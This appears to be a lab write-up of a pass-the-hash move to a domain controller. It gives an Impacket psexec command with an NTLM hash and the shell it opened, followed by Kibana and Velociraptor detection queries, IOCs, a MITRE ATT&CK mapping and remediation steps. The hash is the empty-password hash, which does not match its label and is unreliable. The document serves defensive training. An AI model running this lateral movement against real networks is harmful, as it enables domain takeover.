# Phase 6 – Lateral Movement (Pass-the-Hash to Domain Controller)

**Target:** Domain Controller (DC) – `192.168.1.10`  
**Source:** WS1 (`192.168.1.20`) → Kali (`192.168.1.5`)  
**Objective:** Use extracted NTLM hash of `NATION\Administrator` to move laterally to the Domain Controller.

---

## 1. Execution Summary

After dumping the NTLM hash of the domain administrator (`NATION\Administrator`) from WS1, the attacker used Impacket’s `psexec` to authenticate to the DC via pass-the-hash.

### Command Used (Kali – new terminal)

```bash
impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 nation/administrator@192.168.1.10
```

**Note:** The NTLM hash was extracted in Phase 5. The LM portion is left blank (`:` before NTLM hash).

---

## Successful Output

```text
[*] Service started successfully...
[!] Press help for extra shell commands

Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

---

## 2. Commands Executed on DC Shell

```cmd
hostname
whoami
```

### Expected Output

```text
DC
nation\administrator
```

---

## 3. Detection in Kibana (Elastic Stack)

### 3.1 Network Logon (Event 4624 – Logon Type 3)

```text
host.name: DC AND event.code: 4624 AND winlog.event_data.LogonType: 3
```

**Key Fields:**

| Field | Value |
|------|------|
| Source IP | 192.168.1.5 (Kali) |
| Account | Administrator |
| Domain | NATION |
| Logon Type | 3 (Network Logon) |
| Auth Package | NTLM |

---

### 3.2 Privileged Logon (Event 4672)

```text
host.name: DC AND event.code: 4672
```

---

### 3.3 Process Creation (Event 4688 – PSEXESVC)

```text
event.code: 4688 AND winlog.event_data.ProcessName: *PSEXESVC*
```

---

## 4. Velociraptor Hunting

### 4.1 Suspicious Logon Events

```sql
SELECT * FROM hunt_results()
WHERE System.EventID = 4624
AND EventData.LogonType = '3'
AND EventData.TargetUserName = 'Administrator'
AND EventData.WorkstationName != ''
```

---

### 4.2 PSEXESVC Service Detection

```text
Artifact: Windows.Sys.Services
Filter: Name =~ '(?i)psexesvc'
```

---

## 5. Indicators of Compromise (IOCs)

| Type | Value |
|------|------|
| Source IP | 192.168.1.5 |
| Target | 192.168.1.10 |
| Auth Method | NTLM Pass-the-Hash |
| Service Created | PSEXESVC |
| Credential Used | 31d6cfe0d16ae931b73c59d7e0c089c0 |

---

## 6. MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|----------|----|
| Lateral Movement | Pass the Hash | T1550.002 |
| Lateral Movement | Remote Services (SMB) | T1021.002 |
| Defense Evasion | Modify Authentication | T1556 |

---

## 7. Remediation Recommendations

- Enable **Credential Guard** to protect LSASS memory
- Enforce **SMB signing** to block PsExec-style attacks
- Restrict **Domain Admin usage on workstations**
- Monitor **Event ID 4624 (Logon Type 3)** from unusual IPs
- Enable advanced auditing for logon tracking (4624, 4625)

---
```